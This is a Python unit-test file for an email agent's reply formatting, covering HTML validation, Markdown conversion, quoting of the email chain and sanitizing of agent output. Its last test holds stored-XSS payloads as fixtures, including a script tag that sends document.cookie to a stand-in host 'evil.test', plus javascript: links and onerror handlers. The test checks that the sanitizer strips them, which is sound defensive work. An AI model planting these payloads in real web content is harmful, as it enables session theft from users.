"""Unit tests for HTML email formatting, Markdown conversion, and email chain preservation (Ticket #295)."""

from __future__ import annotations

import unittest

from brainsos_agent.mail_runs import (
    compose_reply_body,
    html_to_plain_text,
    is_valid_html,
    markdown_to_clean_html,
    sanitize_agent_reply,
    sanitize_html,
)
from brainsos_mail.models import ParsedInboundEmail


class TestMailRunsHTMLAndChain(unittest.TestCase):
    def test_is_valid_html_identifies_valid_html_structures(self):
        self.assertTrue(is_valid_html("<p>Hello <b>world</b></p>"))
        self.assertTrue(
            is_valid_html(
                "<!DOCTYPE html><html><head><title>Title</title></head><body><h1>Hi</h1></body></html>"
            )
        )
        self.assertTrue(
            is_valid_html(
                '<table border="1"><tr><th>Header</th></tr><tr><td>Data</td></tr></table>'
            )
        )
        self.assertTrue(
            is_valid_html(
                '<p>Line 1<br>Line 2<img src="pic.png" alt="pic"></p>'
            )
        )
        self.assertTrue(
            is_valid_html("```html\n<div><p>Fenced content</p></div>\n```")
        )

    def test_is_valid_html_rejects_non_html_and_invalid_markup(self):
        self.assertFalse(is_valid_html("# Cluster Status\n\n- item 1\n- item 2"))
        self.assertFalse(is_valid_html("cost < 10 and price > 5"))
        self.assertFalse(is_valid_html("Please contact <support@example.com>"))
        self.assertFalse(is_valid_html("<p>Paragraph <div>nested</p></div>"))
        self.assertFalse(is_valid_html("<div><p>Unclosed"))
        self.assertFalse(is_valid_html("Hello <br> world"))
        self.assertFalse(is_valid_html(""))
        self.assertFalse(is_valid_html("Just plain text without tags."))

    def test_markdown_to_clean_html_preserves_full_html_document(self):
        doc = "<!DOCTYPE html><html><body><h1>Header</h1><p>Body</p></body></html>"
        rendered = markdown_to_clean_html(doc)
        self.assertEqual(rendered, doc)
        self.assertNotIn('<div style="font-family:', rendered)

    def test_markdown_to_clean_html_converts_markdown_elements(self):
        md = (
            "# Cluster Status Report\n\n"
            "All **systems** are operational.\n\n"
            "- Node 1: *Healthy*\n"
            "- Node 2: *Healthy*\n\n"
            "```python\n"
            "def check():\n"
            "    return True\n"
            "```\n\n"
            "Check [Dashboard](https://dash.brainsos.ai) for details."
        )
        rendered = markdown_to_clean_html(md)
        self.assertIn("<h2", rendered)
        self.assertIn("Cluster Status Report", rendered)
        self.assertIn("<strong>systems</strong>", rendered)
        self.assertIn("<em>Healthy</em>", rendered)
        self.assertIn("<ul", rendered)
        self.assertIn("<li", rendered)
        self.assertIn("<pre", rendered)
        self.assertIn("<code", rendered)
        self.assertIn('href="https://dash.brainsos.ai"', rendered)

    def test_markdown_to_clean_html_preserves_existing_html(self):
        raw_html = (
            "<p>Hello, this is already <strong>clean HTML</strong>.</p>\n"
            "<ul>\n"
            "  <li>Item A</li>\n"
            "  <li>Item B</li>\n"
            "</ul>"
        )
        rendered = markdown_to_clean_html(raw_html)
        self.assertIn("<strong>clean HTML</strong>", rendered)
        self.assertIn("<li>Item A</li>", rendered)
        self.assertIn("<div style=", rendered)

    def test_markdown_to_clean_html_strips_code_fence_wrapper(self):
        fenced = (
            "```html\n"
            "<p>Here is the status report.</p>\n"
            "```"
        )
        rendered = markdown_to_clean_html(fenced)
        self.assertNotIn("```", rendered)
        self.assertIn("<p>Here is the status report.</p>", rendered)

    def test_html_to_plain_text_extracts_clean_text(self):
        raw_html = (
            "<div style='font-size:14px;'>"
            "<p>Paragraph 1 with <strong>bold</strong> text.</p>"
            "<br>"
            "<ul>"
            "<li>Item 1</li>"
            "<li>Item 2</li>"
            "</ul>"
            "</div>"
        )
        plain = html_to_plain_text(raw_html)
        self.assertIn("Paragraph 1 with bold text.", plain)
        self.assertIn("- Item 1", plain)
        self.assertIn("- Item 2", plain)
        self.assertNotIn("<p>", plain)
        self.assertNotIn("<ul>", plain)

    def test_compose_reply_body_preserves_email_chain_in_both_formats(self):
        inbound = ParsedInboundEmail(
            message_id="<msg-001@dgx.local.brainsos.ai>",
            thread_id="<msg-001@dgx.local.brainsos.ai>",
            sender="alice@dgx.local.brainsos.ai",
            recipient="bawtford@dgx.local.brainsos.ai",
            subject="Question regarding launch",
            clean_body="Can you confirm if the cluster is ready for launch?",
            body="Can you confirm if the cluster is ready for launch?\n\n-- \nAlice",
            date="Fri, 09 Oct 2026 12:00:00 +0000",
            raw_mime=b"",
        )
        agent_output = "<p>Yes, the cluster is <strong>fully operational</strong>.</p>"

        plain_body, html_body = compose_reply_body(agent_output, inbound)

        # Plain text assertions
        self.assertIn("Yes, the cluster is fully operational.", plain_body)
        self.assertIn("On Fri, 09 Oct 2026 12:00:00 +0000, alice@dgx.local.brainsos.ai wrote:", plain_body)
        self.assertIn("> Can you confirm if the cluster is ready for launch?", plain_body)

        # HTML assertions
        self.assertIn("<strong>fully operational</strong>", html_body)
        self.assertIn("brainsos-quote", html_body)
        self.assertIn("On Fri, 09 Oct 2026 12:00:00 +0000, alice@dgx.local.brainsos.ai wrote:", html_body)
        self.assertIn("Can you confirm if the cluster is ready for launch?", html_body)

    def test_compose_reply_body_handles_raw_html_response_and_inserts_chain_before_body(self):
        inbound = ParsedInboundEmail(
            message_id="<msg-002@dgx.local.brainsos.ai>",
            thread_id="<msg-002@dgx.local.brainsos.ai>",
            sender="bob@dgx.local.brainsos.ai",
            recipient="bawtford@dgx.local.brainsos.ai",
            subject="Full HTML request",
            clean_body="Please send the audit in full HTML format.",
            date="Fri, 09 Oct 2026 12:30:00 +0000",
            raw_mime=b"",
        )
        agent_output = (
            "<!DOCTYPE html>\n"
            "<html>\n"
            "<body>\n"
            "  <h1>Audit Results</h1>\n"
            "  <p>All checks passed.</p>\n"
            "</body>\n"
            "</html>"
        )
        plain, rich = compose_reply_body(agent_output, inbound)
        self.assertIn("Audit Results", plain)
        self.assertIn("All checks passed.", plain)
        self.assertIn("> Please send the audit in full HTML format.", plain)
        self.assertNotIn("<h1>", plain)

        self.assertIn("<h1>Audit Results</h1>", rich)
        self.assertIn("brainsos-quote", rich)
        self.assertTrue(rich.strip().endswith("</html>"))
        self.assertIn("</body>\n</html>", rich)

    def test_sanitize_agent_reply_strips_verifier_footer(self):
        output = (
            "<p>Cheers,<br>Bawtford</p>\n\n"
            "⚠ File-mutation verifier: 1 file(s) were NOT modified this turn despite any wording above that may suggest otherwise. "
            "Run `git status` or `read_file` to confirm. • `/tmp/extract_thesis.py` — [write_file] Write denied: "
            "'/tmp/extract_thesis.py' is outside HERMES_WRITE_SAFE_ROOT (/opt/data). Unset the variable or add this path's directory prefix."
        )
        cleaned = sanitize_agent_reply(output)
        self.assertEqual(cleaned, "<p>Cheers,<br>Bawtford</p>")
        self.assertNotIn("File-mutation verifier", cleaned)

    def test_sanitize_agent_reply_strips_conversational_preamble_before_salutation(self):
        output = (
            "I have everything I need — verified identity, the full 277-page dissertation pulled from UWSpace, "
            "and his broader public profile. Here's the report, formatted as clean HTML.\n\n"
            "<p><strong>Dear Justin,</strong></p>\n\n"
            "<p>Here is your research overview.</p>"
        )
        cleaned = sanitize_agent_reply(output)
        self.assertTrue(cleaned.startswith("<p><strong>Dear Justin,</strong></p>"))
        self.assertNotIn("I have everything I need", cleaned)
        self.assertIn("<p>Here is your research overview.</p>", cleaned)

    def test_sanitize_agent_reply_strips_preamble_before_plain_text_greeting(self):
        output = (
            "Sure! Here is the response:\n\n"
            "Dear Justin,\n\n"
            "Thanks for your email."
        )
        cleaned = sanitize_agent_reply(output)
        self.assertEqual(cleaned, "Dear Justin,\n\nThanks for your email.")

    def test_sanitize_agent_reply_strips_preamble_before_html_structure(self):
        output = (
            "Here is the data in table form:\n\n"
            "<table><tr><td>Metric</td></tr></table>"
        )
        cleaned = sanitize_agent_reply(output)
        self.assertEqual(cleaned, "<table><tr><td>Metric</td></tr></table>")

    def test_sanitize_html_and_compose_reply_body_strip_stored_xss_vectors(self):
        malicious_html = (
            '<div onclick="alert(1)" style="color: expression(alert(2));">'
            '<p>Safe text</p>'
            '<script>fetch("https://evil.test/steal?c=" + document.cookie)</script>'
            '<iframe src="https://evil.test/frame"></iframe>'
            '<img src="javascript:alert(3)" onerror="alert(4)" alt="bad">'
            '<a href="javascript:alert(5)" target="_blank">click</a>'
            '<a href="https://brainsos.ai" target="_blank">good</a>'
            "</div>"
        )
        cleaned = sanitize_html(malicious_html)
        self.assertIn("<p>Safe text</p>", cleaned)
        self.assertIn('href="https://brainsos.ai"', cleaned)
        self.assertIn('rel="noopener noreferrer"', cleaned)
        for bad_token in ("<script", "<iframe", "onclick", "onerror", "javascript:", "expression(", "document.cookie"):
            self.assertNotIn(bad_token, cleaned.lower())

        rendered = markdown_to_clean_html(malicious_html)
        self.assertNotIn("<script", rendered.lower())
        self.assertNotIn("javascript:", rendered.lower())

        inbound = ParsedInboundEmail(
            message_id="<msg-xss@brainsos.local>",
            thread_id="<msg-xss@brainsos.local>",
            sender="attacker@evil.test",
            recipient="ping@brainsos.local",
            subject="XSS quote check",
            clean_body="Please review quote.",
            html_body='<p>Inbound text</p><script>alert("xss")</script><img src=x onerror=alert(9)>',
            raw_mime=b"",
        )
        _, rich_reply = compose_reply_body("<p>Reply OK</p>", inbound)
        self.assertIn("Inbound text", rich_reply)
        self.assertNotIn("<script", rich_reply.lower())
        self.assertNotIn("onerror", rich_reply.lower())


if __name__ == "__main__":
    unittest.main()
